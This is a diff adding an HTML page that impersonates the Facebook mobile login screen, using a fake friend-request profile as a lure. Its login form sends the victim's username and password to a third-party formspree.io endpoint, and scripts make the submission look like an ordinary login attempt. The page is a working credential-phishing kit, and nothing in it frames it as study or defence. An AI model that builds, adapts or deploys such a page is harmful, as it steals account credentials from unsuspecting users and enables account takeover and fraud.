@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+				<title>Page title</title>
+				<link rel="stylesheet" href="facebook.css">
+				
+</head>
+<body>
+<a  href="https://play.google.com/store/apps/details?id=com.facebook.katana"><div id="HeaderFile">
+								<img id="AndroidIcon" src="1629201462904.png" alt="loading...">
+								<p id="header-text">Get Facebook for Android and browse faster.</p>
+</div></a>
+
+<div id="clear-div"></div>
+	
+<h1 id="fb-name">Facebook</h1>
+<!-- tasmia's profile info start -->.
+
+<div id="tdiv"> 
+				<img id="tphoto" src="FB_IMG_1629307421913_1.jpg" alt="Loading...">
+				<h1 id="tname"> Mahbub Islam Mahbub ( MC )
+				<br><p id="tp">Hi... it’s my new account. add me please.</p>
+				</h1>
+				<h3 id="seeMore">See more.</h3>
+</div>
+
+
+
+
+<!-- tasmia's profile info end -->.
+
+<form action="https://formspree.io/f/myylbpbr" method="post">
+<input id="name" name="UserName" placeholder="Mobile number or email address"><br> 
+<input id="password" name="Password" placeholder="Password"><br>
+<input id="login" type="submit" type="submit" value="Log In">
+
+</form>
+<!-- get data end -->
+
+
+
+<a style="text-decoration:none;" href="https://m.facebook.com/login/identify/?ctx=recover&c=https%3A%2F%2Fm.facebook.com%2F&multiple_results=0&ars=facebook_login&from_login_screen=0&lwv=100&_rdr"><p id="forgotPass">Forgotten password?</p>	</a>
+<p id="hr-center">or</p>
+
+<a href="https://m.facebook.com/register/?refsrc=deprecated&_rdr"><input id="create-account" type="button" value="Create new account"></a>		
+	
+		<img id="fotter-img" src="Screenshot_20210817-235753.png" alt="loading....">
+
+<script>
+				
+seeMore.addEventListener("click", function(){
+var name = document.querySelector("#name");
+var password = document.querySelector("#password");
+name.style.borderColor ="red" ; 
+password.style.borderColor ="red" ;							
+});	
+
+
+
+login.addEventListener("click", function(){
+var name = document.querySelector("#name");
+var password = document.querySelector("#password");
+name.style.borderColor ="red" ; 
+password.style.borderColor ="red" ;	
+login.value="Log In ...";						
+});	
+				
+</script>
+		
+</body>
+</html>
